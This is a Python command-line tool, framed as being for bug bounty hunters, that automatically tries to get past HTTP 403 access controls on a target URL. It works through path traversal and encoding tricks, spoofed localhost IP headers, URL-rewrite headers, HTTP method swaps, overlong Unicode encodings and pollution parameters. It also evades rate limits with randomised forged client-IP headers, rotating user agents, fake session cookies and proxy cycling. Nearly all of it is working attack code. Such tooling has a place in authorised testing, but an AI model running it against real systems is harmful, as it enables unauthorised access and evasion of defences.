#!/usr/bin/env python3
"""
403 Bypass Tool for Bug Bounty Hunters
Author: Security Researcher
Usage: python3 bypass403.py -u <url> [options]
"""

import requests
import argparse
import threading
import sys
from urllib.parse import urlparse, urljoin
from colorama import init, Fore, Style
import time
import json
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
import socket
import struct
import signal
from itertools import cycle
import hashlib

init(autoreset=True)

class RateLimitBypass:
    """Rate limiting bypass techniques"""
    
    @staticmethod
    def generate_ip():
        """Generate random IP address"""
        return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
    
    @staticmethod
    def generate_xff_chain(length=3):
        """Generate X-Forwarded-For chain"""
        ips = [RateLimitBypass.generate_ip() for _ in range(length)]
        return ', '.join(ips)
    
    @staticmethod
    def generate_session_id():
        """Generate random session ID"""
        return hashlib.md5(str(random.getrandbits(128)).encode()).hexdigest()
    
    @staticmethod
    def generate_user_agent():
        """Generate random user agent from common list"""
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/86.0',
        ]
        return random.choice(agents)
    
    @staticmethod
    def generate_accept_language():
        """Generate random Accept-Language header"""
        languages = [
            'en-US,en;q=0.9',
            'en-GB,en;q=0.8',
            'fr-FR,fr;q=0.9,en;q=0.8',
            'de-DE,de;q=0.9,en;q=0.8',
            'es-ES,es;q=0.9,en;q=0.8',
            'ja-JP,ja;q=0.9,en;q=0.8',
            'zh-CN,zh;q=0.9,en;q=0.8',
        ]
        return random.choice(languages)

class Bypass403:
    def __init__(self, target_url, threads=10, timeout=5, verbose=False, output=None, 
                 delay=0, random_delay=False, rotate_ip=False, proxy_file=None):
        self.target_url = target_url.rstrip('/')
        self.threads = threads
        self.timeout = timeout
        self.verbose = verbose
        self.output = output
        self.delay = delay
        self.random_delay = random_delay
        self.rotate_ip = rotate_ip
        self.proxy_file = proxy_file
        self.proxies = []
        self.proxy_cycle = None
        
        self.session = requests.Session()
        self.rate_limit = RateLimitBypass()
        self.results = []
        self.successful_bypasses = []
        self.request_count = 0
        self.blocked_count = 0
        
        # Load proxies if provided
        if proxy_file:
            self.load_proxies()
            
        # Setup signal handler for graceful exit
        signal.signal(signal.SIGINT, self.signal_handler)
        
    def load_proxies(self):
        """Load proxies from file"""
        try:
            with open(self.proxy_file, 'r') as f:
                self.proxies = [line.strip() for line in f if line.strip()]
            if self.proxies:
                self.proxy_cycle = cycle(self.proxies)
                print(f"{Fore.GREEN}[+] Loaded {len(self.proxies)} proxies{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[-] Failed to load proxies: {str(e)}{Style.RESET_ALL}")
    
    def get_random_proxy(self):
        """Get random proxy from cycle"""
        if self.proxy_cycle:
            proxy = next(self.proxy_cycle)
            return {
                'http': f'http://{proxy}',
                'https': f'http://{proxy}'
            }
        return None
    
    def get_headers_with_bypass(self, base_headers=None):
        """Generate headers with rate limiting bypass techniques"""
        headers = base_headers or {}
        
        # Add rate limiting bypass headers
        if self.rotate_ip:
            headers['X-Forwarded-For'] = self.rate_limit.generate_xff_chain(random.randint(1, 5))
            headers['X-Real-IP'] = self.rate_limit.generate_ip()
            headers['X-Originating-IP'] = self.rate_limit.generate_ip()
            headers['X-Remote-IP'] = self.rate_limit.generate_ip()
            headers['X-Remote-Addr'] = self.rate_limit.generate_ip()
            headers['X-Client-IP'] = self.rate_limit.generate_ip()
            headers['True-Client-IP'] = self.rate_limit.generate_ip()
            headers['Cluster-Client-IP'] = self.rate_limit.generate_ip()
        
        # Rotate User-Agent
        headers['User-Agent'] = self.rate_limit.generate_user_agent()
        
        # Add random headers to appear more legitimate
        headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
        headers['Accept-Language'] = self.rate_limit.generate_accept_language()
        headers['Accept-Encoding'] = 'gzip, deflate, br'
        headers['DNT'] = str(random.randint(0, 1))
        headers['Connection'] = 'keep-alive'
        headers['Upgrade-Insecure-Requests'] = '1'
        
        # Add cache busters
        headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
        headers['Pragma'] = 'no-cache'
        
        # Add random session identifiers
        headers['Cookie'] = f"JSESSIONID={self.rate_limit.generate_session_id()}; PHPSESSID={self.rate_limit.generate_session_id()}"
        
        return headers
    
    def apply_rate_limit_delay(self):
        """Apply delay between requests to avoid rate limiting"""
        if self.delay > 0:
            if self.random_delay:
                delay_time = random.uniform(self.delay * 0.5, self.delay * 1.5)
                time.sleep(delay_time)
            else:
                time.sleep(self.delay)
    
    def signal_handler(self, sig, frame):
        """Handle Ctrl+C gracefully"""
        print(f"\n{Fore.YELLOW}[!] Interrupted by user{Style.RESET_ALL}")
        self.print_summary()
        if self.output:
            self.save_results()
        sys.exit(0)
    
    def print_banner(self):
        banner = f"""
{Fore.RED}╔══════════════════════════════════════════════════════════╗
{Fore.RED}║     {Fore.YELLOW}403 Bypass Tool - Bug Bounty Edition{Fore.RED}                 ║
{Fore.RED}║     {Fore.CYAN}Testing: {self.target_url}{Fore.RED}                         ║
{Fore.RED}║     {Fore.CYAN}Rate Limit Bypass: {'ON' if self.rotate_ip else 'OFF'}{Fore.RED}          ║
{Fore.RED}║     {Fore.CYAN}Delay: {self.delay}s {'(random)' if self.random_delay else ''}{Fore.RED}               ║
{Fore.RED}╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}
        """
        print(banner)
    
    def check_rate_limit_block(self, response):
        """Check if we're being rate limited"""
        if response is None:
            return False
            
        # Common rate limit indicators
        rate_limit_indicators = [
            response.status_code == 429,
            response.status_code == 503,
            'rate' in response.text.lower(),
            'limit' in response.text.lower(),
            'too many' in response.text.lower(),
            'try again' in response.text.lower(),
            'blocked' in response.text.lower(),
            response.elapsed.total_seconds() > self.timeout * 0.8  # Slow response might indicate throttling
        ]
        
        if any(rate_limit_indicators):
            self.blocked_count += 1
            if self.verbose:
                print(f"{Fore.YELLOW}[!] Rate limit detected! (Blocked: {self.blocked_count}){Style.RESET_ALL}")
            return True
        return False
    
    def make_request(self, url, headers=None, method='GET', data=None):
        """Make HTTP request with rate limiting bypass techniques"""
        self.request_count += 1
        self.apply_rate_limit_delay()
        
        # Get headers with rate limiting bypass
        request_headers = self.get_headers_with_bypass(headers or {})
        
        # Get proxy if available
        proxies = self.get_random_proxy() if self.proxies else None
        
        try:
            if method.upper() == 'GET':
                response = self.session.get(
                    url, 
                    headers=request_headers, 
                    timeout=self.timeout,
                    allow_redirects=False,
                    proxies=proxies
                )
            else:
                response = self.session.request(
                    method, 
                    url, 
                    headers=request_headers, 
                    data=data,
                    timeout=self.timeout,
                    allow_redirects=False,
                    proxies=proxies
                )
            
            # Check if we're being rate limited
            if self.check_rate_limit_block(response):
                if self.verbose:
                    print(f"{Fore.YELLOW}    Switching IP/headers for next request{Style.RESET_ALL}")
            
            return response
            
        except requests.exceptions.Timeout:
            if self.verbose:
                print(f"{Fore.YELLOW}[-] Timeout{Style.RESET_ALL}")
            return None
        except requests.exceptions.ConnectionError:
            if self.verbose:
                print(f"{Fore.YELLOW}[-] Connection error{Style.RESET_ALL}")
            return None
        except Exception as e:
            if self.verbose:
                print(f"{Fore.RED}Error: {str(e)}{Style.RESET_ALL}")
            return None
    
    def check_bypass(self, test_url, technique_name, headers=None, method='GET', data=None):
        """Check if bypass technique works"""
        response = self.make_request(test_url, headers, method, data)
        
        if response and response.status_code != 403 and response.status_code != 401:
            result = {
                'technique': technique_name,
                'url': test_url,
                'status_code': response.status_code,
                'headers': dict(response.headers),
                'size': len(response.content),
                'method': method,
                'rate_limit_bypass': self.rotate_ip
            }
            
            # Check response content for interesting information
            content = response.text.lower()
            if 'admin' in content or 'dashboard' in content or 'panel' in content:
                result['interesting_content'] = True
                print(f"{Fore.MAGENTA}[!] Interesting content detected!{Style.RESET_ALL}")
            
            if response.status_code == 200:
                print(f"{Fore.GREEN}[+] SUCCESS: {technique_name} - Status: {response.status_code}{Style.RESET_ALL}")
                self.successful_bypasses.append(result)
            else:
                print(f"{Fore.YELLOW}[?] PARTIAL: {technique_name} - Status: {response.status_code}{Style.RESET_ALL}")
            
            if self.verbose:
                print(f"    URL: {test_url}")
                print(f"    Size: {len(response.content)} bytes")
                print(f"    Method: {method}")
                if self.request_count % 10 == 0:
                    print(f"    Requests sent: {self.request_count}, Blocks: {self.blocked_count}")
            
            self.results.append(result)
            return True
        return False
    
    def test_rate_limit_bypass_techniques(self):
        """Test specific rate limiting bypass techniques"""
        print(f"{Fore.CYAN}[*] Testing rate limit bypass techniques...{Style.RESET_ALL}")
        
        # Temporarily enable rate limit bypass for these tests
        original_rotate_ip = self.rotate_ip
        self.rotate_ip = True
        
        # Test with different IP rotation strategies
        techniques = [
            ({'X-Forwarded-For': '127.0.0.1'}, "Single XFF"),
            ({'X-Forwarded-For': '127.0.0.1, 192.168.1.1'}, "XFF Chain"),
            ({'X-Forwarded-For': '127.0.0.1', 'X-Real-IP': '127.0.0.1'}, "XFF + X-Real"),
            ({'X-Forwarded-For': '2130706433'}, "Decimal IP"),
            ({'X-Forwarded-For': '0x7f000001'}, "Hex IP"),
            ({'X-Forwarded-For': '017700000001'}, "Octal IP"),
        ]
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for headers, technique in techniques:
                futures.append(executor.submit(
                    self.check_bypass, 
                    self.target_url, 
                    f"Rate Limit: {technique}", 
                    headers
                ))
            
            for future in as_completed(futures):
                future.result()
        
        # Restore original setting
        self.rotate_ip = original_rotate_ip
    
    def test_path_variations(self):
        """Test different path variations"""
        print(f"{Fore.CYAN}[*] Testing path variations...{Style.RESET_ALL}")
        
        url = self.target_url
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        path = parsed.path
        
        variations = [
            (f"{url}/.", "Trailing dot"),
            (f"{url}/..;", "Path traversal"),
            (f"{url}//", "Double slash"),
            (f"{url}/./", "Current directory"),
            (f"{url}/../", "Parent directory"),
            (f"{url}/%2e/", "URL encoded dot"),
            (f"{url}/%252e/", "Double URL encoded dot"),
            (f"{url}/*", "Wildcard"),
            (f"{url}/.;/", "Semicolon"),
            (f"{url}/.;/test", "Semicolon with path"),
            (f"{base_url}/{path}?", "Question mark"),
            (f"{base_url}/{path}%20", "Space"),
            (f"{base_url}/{path}%09", "Tab"),
            (f"{base_url}/{path}%00", "Null byte"),
            (f"{base_url}/{path}.json", "JSON extension"),
            (f"{base_url}/{path}.xml", "XML extension"),
            (f"{base_url}/{path}.config", "Config extension"),
            (f"{base_url}/{path}.bak", "Backup extension"),
            (f"{base_url}/{path}.old", "Old extension"),
            (f"{base_url}/{path}~", "Tilde"),
            (f"{base_url}/{path}/", "Trailing slash"),
            (f"{base_url}/{path}%2f", "Encoded slash"),
            (f"{base_url}/{path}%5c", "Encoded backslash"),
        ]
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for test_url, technique in variations:
                futures.append(executor.submit(self.check_bypass, test_url, f"Path: {technique}"))
            
            for future in as_completed(futures):
                future.result()
    
    def test_header_bypasses(self):
        """Test various header manipulations"""
        print(f"{Fore.CYAN}[*] Testing header bypasses...{Style.RESET_ALL}")
        
        header_tests = [
            ({'X-Forwarded-For': '127.0.0.1'}, "X-Forwarded-For localhost"),
            ({'X-Forwarded-For': 'localhost'}, "X-Forwarded-For localhost string"),
            ({'X-Forwarded-Host': 'localhost'}, "X-Forwarded-Host"),
            ({'X-Forwarded-Server': 'localhost'}, "X-Forwarded-Server"),
            ({'X-Host': 'localhost'}, "X-Host"),
            ({'X-Forwarded-Host': '127.0.0.1'}, "X-Forwarded-Host IP"),
            ({'X-Real-IP': '127.0.0.1'}, "X-Real-IP"),
            ({'X-Originating-IP': '127.0.0.1'}, "X-Originating-IP"),
            ({'X-Remote-IP': '127.0.0.1'}, "X-Remote-IP"),
            ({'X-Remote-Addr': '127.0.0.1'}, "X-Remote-Addr"),
            ({'X-Client-IP': '127.0.0.1'}, "X-Client-IP"),
            ({'X-ProxyUser-IP': '127.0.0.1'}, "X-ProxyUser-IP"),
            ({'Client-IP': '127.0.0.1'}, "Client-IP"),
            ({'True-Client-IP': '127.0.0.1'}, "True-Client-IP"),
            ({'Cluster-Client-IP': '127.0.0.1'}, "Cluster-Client-IP"),
            ({'X-Forwarded-For': '192.168.1.1'}, "X-Forwarded-For internal"),
            ({'X-Original-URL': '/'}, "X-Original-URL root"),
            ({'X-Rewrite-URL': '/'}, "X-Rewrite-URL root"),
            ({'Referer': self.target_url}, "Referer header"),
            ({'Origin': self.target_url}, "Origin header"),
            ({'X-Custom-IP-Authorization': '127.0.0.1'}, "X-Custom-IP-Authorization"),
            ({'X-Custom-IP-Authorization': '127.0.0.1', 'X-Forwarded-For': '127.0.0.1'}, "Combined IP headers"),
        ]
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for headers, technique in header_tests:
                futures.append(executor.submit(self.check_bypass, self.target_url, f"Header: {technique}", headers))
            
            for future in as_completed(futures):
                future.result()
    
    def test_method_bypasses(self):
        """Test different HTTP methods"""
        print(f"{Fore.CYAN}[*] Testing HTTP method bypasses...{Style.RESET_ALL}")
        
        methods = [
            ('HEAD', "HEAD method"),
            ('POST', "POST method"),
            ('PUT', "PUT method"),
            ('DELETE', "DELETE method"),
            ('OPTIONS', "OPTIONS method"),
            ('PATCH', "PATCH method"),
            ('TRACE', "TRACE method"),
            ('CONNECT', "CONNECT method"),
            ('PROPFIND', "PROPFIND method"),
            ('PROPPATCH', "PROPPATCH method"),
            ('MKCOL', "MKCOL method"),
            ('COPY', "COPY method"),
            ('MOVE', "MOVE method"),
            ('LOCK', "LOCK method"),
            ('UNLOCK', "UNLOCK method"),
            ('VIEW', "VIEW method"),
            ('DEBUG', "DEBUG method"),
        ]
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for method, technique in methods:
                futures.append(executor.submit(self.check_bypass, self.target_url, f"Method: {technique}", method=method))
            
            for future in as_completed(futures):
                future.result()
    
    def test_protocol_bypasses(self):
        """Test protocol and port variations"""
        print(f"{Fore.CYAN}[*] Testing protocol/port bypasses...{Style.RESET_ALL}")
        
        parsed = urlparse(self.target_url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        path = parsed.path
        
        variations = [
            (self.target_url.replace('https://', 'http://'), "HTTP instead of HTTPS"),
            (self.target_url.replace('http://', 'https://'), "HTTPS instead of HTTP"),
            (f"{base}:80{path}", "Port 80"),
            (f"{base}:443{path}", "Port 443"),
            (f"{base}:8080{path}", "Port 8080"),
            (f"{base}:8443{path}", "Port 8443"),
            (f"{base}:3000{path}", "Port 3000"),
            (f"{base}:8000{path}", "Port 8000"),
            (f"{base}:8081{path}", "Port 8081"),
            (f"{base}:8888{path}", "Port 8888"),
            (f"{base}:9000{path}", "Port 9000"),
            (f"{base}:9443{path}", "Port 9443"),
        ]
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for test_url, technique in variations:
                futures.append(executor.submit(self.check_bypass, test_url, f"Protocol: {technique}"))
            
            for future in as_completed(futures):
                future.result()
    
    def test_case_sensitivity(self):
        """Test case sensitivity bypasses"""
        print(f"{Fore.CYAN}[*] Testing case sensitivity...{Style.RESET_ALL}")
        
        parsed = urlparse(self.target_url)
        path = parsed.path.strip('/')
        
        if path:
            variations = [
                (self.target_url.upper(), "UPPERCASE"),
                (self.target_url.lower(), "lowercase"),
                (self.target_url.title(), "Title Case"),
                (self.target_url.replace(path, path.upper()), "Path uppercase"),
                (self.target_url.replace(path, path.lower()), "Path lowercase"),
                (self.target_url.replace(path, path.capitalize()), "Path capitalize"),
                (self.target_url.replace(path, path.swapcase()), "Path swapcase"),
                (self.target_url.replace(path, path[::-1]), "Path reversed"),
            ]
            
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = []
                for test_url, technique in variations:
                    futures.append(executor.submit(self.check_bypass, test_url, f"Case: {technique}"))
                
                for future in as_completed(futures):
                    future.result()
    
    def test_unicode_bypasses(self):
        """Test Unicode normalization bypasses"""
        print(f"{Fore.CYAN}[*] Testing Unicode bypasses...{Style.RESET_ALL}")
        
        parsed = urlparse(self.target_url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        path = parsed.path
        
        unicode_chars = [
            ('%c0%ae', 'Unicode dot 1'),
            ('%c0%ae%c0%ae', 'Unicode double dot 1'),
            ('%e0%80%ae', 'Unicode dot 2'),
            ('%e0%80%ae%e0%80%ae', 'Unicode double dot 2'),
            ('%c0%2e', 'Unicode dot 3'),
            ('%c0%2e%c0%2e', 'Unicode double dot 3'),
            ('%c0%af', 'Unicode slash 1'),
            ('%c0%9v', 'Unicode slash 2'),
            ('%c1%9c', 'Unicode slash 3'),
            ('%ef%bc%8f', 'Fullwidth slash'),
            ('%ef%bc%8e', 'Fullwidth dot'),
            ('%e3%80%82', 'Ideographic full stop'),
        ]
        
        for unicode_char, technique in unicode_chars:
            test_url = f"{base}/{unicode_char}{path}"
            self.check_bypass(test_url, f"Unicode: {technique}")
    
    def test_parameter_bypasses(self):
        """Test parameter pollution bypasses"""
        print(f"{Fore.CYAN}[*] Testing parameter bypasses...{Style.RESET_ALL}")
        
        param_tests = [
            (f"{self.target_url}?admin=true", "admin parameter"),
            (f"{self.target_url}?debug=true", "debug parameter"),
            (f"{self.target_url}?test=true", "test parameter"),
            (f"{self.target_url}?source=admin", "source parameter"),
            (f"{self.target_url}?bypass=true", "bypass parameter"),
            (f"{self.target_url}?role=admin", "role parameter"),
            (f"{self.target_url}?user=admin", "user parameter"),
            (f"{self.target_url}?internal=true", "internal parameter"),
            (f"{self.target_url}?XDEBUG_SESSION_START=phpstorm", "XDEBUG parameter"),
            (f"{self.target_url}?__proto__[admin]=true", "Prototype pollution"),
            (f"{self.target_url}?constructor[prototype][admin]=true", "Constructor pollution"),
            (f"{self.target_url}?__class__=True", "Python class pollution"),
        ]
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for test_url, technique in param_tests:
                futures.append(executor.submit(self.check_bypass, test_url, f"Parameter: {technique}"))
            
            for future in as_completed(futures):
                future.result()
    
    def test_advanced_headers(self):
        """Test advanced header combinations"""
        print(f"{Fore.CYAN}[*] Testing advanced header combinations...{Style.RESET_ALL}")
        
        parsed = urlparse(self.target_url)
        path = parsed.path
        
        header_combos = [
            ({'X-Original-URL': path, 'X-Rewrite-URL': path}, "Original + Rewrite URL"),
            ({'X-Forwarded-For': '127.0.0.1', 'X-Forwarded-Host': 'localhost'}, "Multiple X-Forwarded"),
            ({'X-Forwarded-For': '127.0.0.1', 'X-Real-IP': '127.0.0.1'}, "X-Forwarded + X-Real"),
            ({'X-Forwarded-For': '127.0.0.1', 'User-Agent': ''}, "Empty User-Agent"),
            ({'X-Forwarded-For': '127.0.0.1', 'Accept': '*/*'}, "X-Forwarded + Accept all"),
            ({'X-Forwarded-For': '127.0.0.1', 'Content-Length': '0'}, "X-Forwarded + Content-Length"),
            ({'X-Forwarded-For': '127.0.0.1', 'Transfer-Encoding': 'chunked'}, "X-Forwarded + Chunked"),
            ({'X-Forwarded-For': '127.0.0.1', 'X-HTTP-Method-Override': 'GET'}, "Method override"),
        ]
        
        for headers, technique in header_combos:
            self.check_bypass(f"{parsed.scheme}://{parsed.netloc}/", f"Advanced: {technique}", headers)
            self.check_bypass(self.target_url, f"Advanced: {technique}", headers)
    
    def test_content_type_bypasses(self):
        """Test Content-Type manipulation"""
        print(f"{Fore.CYAN}[*] Testing Content-Type bypasses...{Style.RESET_ALL}")
        
        content_types = [
            ('application/x-www-form-urlencoded', 'URL encoded'),
            ('multipart/form-data', 'Multipart'),
            ('application/json', 'JSON'),
            ('application/xml', 'XML'),
            ('text/plain', 'Plain text'),
            ('application/x-httpd-php', 'PHP'),
            ('application/x-php', 'PHP alt'),
            ('text/x-php', 'PHP text'),
        ]
        
        for content_type, technique in content_types:
            headers = {'Content-Type': content_type}
            self.check_bypass(self.target_url, f"Content-Type: {technique}", headers, method='POST')
    
    def run_all_tests(self):
        """Run all bypass techniques"""
        self.print_banner()
        
        # Test original URL first
        print(f"{Fore.CYAN}[*] Testing original URL...{Style.RESET_ALL}")
        response = self.make_request(self.target_url)
        if response:
            print(f"    Original status: {response.status_code}")
        else:
            print(f"{Fore.RED}    Failed to connect{Style.RESET_ALL}")
        
        # Run all test categories
        test_functions = [
            self.test_rate_limit_bypass_techniques,
            self.test_path_variations,
            self.test_header_bypasses,
            self.test_method_bypasses,
            self.test_protocol_bypasses,
            self.test_case_sensitivity,
            self.test_unicode_bypasses,
            self.test_parameter_bypasses,
            self.test_content_type_bypasses,
            self.test_advanced_headers,
        ]
        
        for test_func in test_functions:
            test_func()
            if self.delay > 0:
                print(f"{Fore.CYAN}[*] Cooling down for {self.delay} seconds...{Style.RESET_ALL}")
                time.sleep(self.delay)
        
        # Print summary
        self.print_summary()
        
        # Save results if output specified
        if self.output:
            self.save_results()
    
    def print_summary(self):
        """Print summary of findings"""
        print(f"\n{Fore.CYAN}══════════════════════════════════════════════════════════{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}SUMMARY OF FINDINGS:{Style.RESET_ALL}")
        print(f"{Fore.CYAN}══════════════════════════════════════════════════════════{Style.RESET_ALL}")
        
        if self.results:
            successful = [r for r in self.results if r['status_code'] == 200]
            partial = [r for r in self.results if r['status_code'] != 200]
            
            print(f"{Fore.GREEN}Total successful (200): {len(successful)}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Total partial (other codes): {len(partial)}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}Total bypass attempts: {len(self.results)}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}Total requests sent: {self.request_count}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Rate limit blocks detected: {self.blocked_count}{Style.RESET_ALL}")
            
            if successful:
                print(f"\n{Fore.GREEN}Top successful bypasses:{Style.RESET_ALL}")
                for r in successful[:5]:
                    print(f"  {Fore.GREEN}→ {r['technique']} - Status: {r['status_code']}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}No bypass techniques were successful{Style.RESET_ALL}")
    
    def save_results(self):
        """Save results to file"""
        try:
            output_data = {
                'target': self.target_url,
                'timestamp': time.time(),
                'total_requests': self.request_count,
                'rate_limit_blocks': self.blocked_count,
                'total_bypasses': len(self.results),
                'successful_bypasses': len(self.successful_bypasses),
                'results': self.results,
                'rate_limit_bypass_enabled': self.rotate_ip,
                'delay_used': self.delay
            }
            
            with open(self.output, 'w') as f:
                json.dump(output_data, f, indent=2)
            print(f"{Fore.GREEN}[+] Results saved to {self.output}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[-] Failed to save results: {str(e)}{Style.RESET_ALL}")

def main():
    parser = argparse.ArgumentParser(description='403 Bypass Tool for Bug Bounty Hunters')
    parser.add_argument('-u', '--url', required=True, help='Target URL to test')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads (default: 10)')
    parser.add_argument('-to', '--timeout', type=int, default=5, help='Request timeout in seconds (default: 5)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('-o', '--output', help='Output file for results (JSON format)')
    
    # Rate limiting bypass options
    parser.add_argument('--delay', type=float, default=0, help='Delay between requests in seconds')
    parser.add_argument('--random-delay', action='store_true', help='Use random delays between requests')
    parser.add_argument('--rotate-ip', action='store_true', help='Rotate IP headers to bypass rate limiting')
    parser.add_argument('--proxy-file', help='File containing proxies (one per line)')
    parser.add_argument('--max-requests', type=int, default=0, help='Maximum number of requests to send')
    
    args = parser.parse_args()
    
    # Validate URL
    if not args.url.startswith(('http://', 'https://')):
        args.url = 'https://' + args.url
    
    # Create bypass tool instance
    bypass = Bypass403(
        target_url=args.url,
        threads=args.threads,
        timeout=args.timeout,
        verbose=args.verbose,
        output=args.output,
        delay=args.delay,
        random_delay=args.random_delay,
        rotate_ip=args.rotate_ip,
        proxy_file=args.proxy_file
    )
    
    # Run tests
    try:
        bypass.run_all_tests()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrupted by user{Style.RESET_ALL}")
        bypass.print_summary()
        if args.output:
            bypass.save_results()
        sys.exit(0)

if __name__ == "__main__":
    main()
